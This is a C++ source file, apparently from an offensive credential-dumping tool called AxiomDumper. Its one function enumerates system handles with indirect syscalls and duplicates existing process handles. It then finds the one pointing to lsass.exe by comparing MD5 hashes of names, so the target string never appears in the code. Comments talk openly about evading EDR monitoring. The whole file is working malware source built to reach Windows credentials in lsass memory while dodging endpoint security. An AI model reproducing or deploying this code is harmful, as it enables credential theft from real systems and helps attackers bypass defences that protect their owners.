#include <stdio.h>

#include "AxiomDumper.h"
#include "SSN.h"
#include "SSN_Hashes.h"

//https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/get-all-open-handles-and-kernel-object-address-from-userland
HANDLE AXIOM_HDuplicate()
{
    HANDLE hProcess = nullptr;
    HANDLE hDuplicate = nullptr;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG handleTableInformationSize = sizeof(PSYSTEM_HANDLE_INFORMATION);
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));

    status = -1;
    while (true)
    {
        IndirectSyscall(
            status,
            AXIOM_SSN_NtQuerySystemInformation,
            16, //SystemHandleInformation
            handleTableInformation,
            handleTableInformationSize,
            &handleTableInformationSize
        );

        if (status != 0)
            handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));
        else
            break;
    }
    //DEBUG_LOG("[DEBUG] QuerySysInfo success\n");

    //DEBUG_LOG("[DEBUG] Looping through all system handles\n");
    for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
    {
        CLIENT_ID clientId;
        OBJECT_ATTRIBUTES objAttr;
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = static_cast<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(handleTableInformation->Handles[i]);

        if (handleInfo.GrantedAccess == PROCESS_TERMINATE) {
            continue;
        }

        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
        clientId.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(handleInfo.UniqueProcessId));
        clientId.UniqueThread = 0;

        // The particular part is easily flagged by EDRs that monitor OpenProcess events in the kernel
        // I uh... don't know how to avoid this for now
        IndirectSyscall(
            status,
            AXIOM_SSN_ZwOpenProcess,
            &hProcess,
            PROCESS_DUP_HANDLE,
            &objAttr,
            &clientId
        );

        if (NT_SUCCESS(status) && hProcess != nullptr)
        {
            IndirectSyscall(
                status,
                AXIOM_SSN_NtDuplicateObject,
                hProcess,
                handleInfo.HandleValue,
                NtCurrentProcess(),
                &hDuplicate,
                PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION,
                0, 0
            );

            if (NT_SUCCESS(status) && hDuplicate != nullptr)
            {
                POBJECT_TYPE_INFORMATION objTypeInfo = NULL;
                ULONG objTypeInfoSize = sizeof(POBJECT_TYPE_INFORMATION);

                status = -1;
                objTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeInfoSize));
                while (status != 0)
                {
                    IndirectSyscall(
                        status,
                        AXIOM_SSN_NtQueryObject,
                        hDuplicate,
                        2, //ObjectTypeInformation
                        objTypeInfo,
                        objTypeInfoSize,
                        &objTypeInfoSize
                    );

                    if (status != 0)
                        objTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeInfoSize));
                    else
                        break;
                }

                //03275f0982bbfc4ec0e0104f387bd4cd is hash for "Process"
                //Meaning we opened a handle towards a Process object, hopefully lsass
                if (drunk_strcmp(drunk_md5(drunk_wchar_to_cstring(objTypeInfo->Name.Buffer)), "03275f0982bbfc4ec0e0104f387bd4cd") == 0)
                {
                    TCHAR buffer[MAX_PATH];
                    DWORD bufferSize = MAX_PATH;

                    //DEBUG_LOG("[DEBUG] Handle opened towards a Process object: ");
                    if (QueryFullProcessImageName(hDuplicate, 0, buffer, &bufferSize))
                    {
                        // Identify the process based on DrunkHash of its path name
                        //bde503488303910db4ef6774fe16d6d7 is hash for C:\Windows\System32\lsass.exe
                        char* c_buffer;

                        c_buffer = (char*)drunk_wchar_to_cstring(buffer);
                        //DEBUG_LOG("%s\n", c_buffer);
                        if (drunk_strcmp((const char*)drunk_md5(c_buffer), "bde503488303910db4ef6774fe16d6d7") == 0)
                        {
                            //DEBUG_LOG("[DEBUG] Duplicated HANDLE pointer: 0x%p\n", hDuplicate);
                            memset(c_buffer, 0, strlen(c_buffer));
                            free((void*)c_buffer);
                            return (hDuplicate);
                        }
                        memset(c_buffer, 0, strlen(c_buffer));
                        free((void*)c_buffer);
                    }
                    else {
                        //printf("(none)\n");
                    }
                }
            }
            //DEBUG_LOG("[WARNING] PROC_VM_READ denied (RunAsPPL ?)\n");
        }
    }
    return (NULL);
}
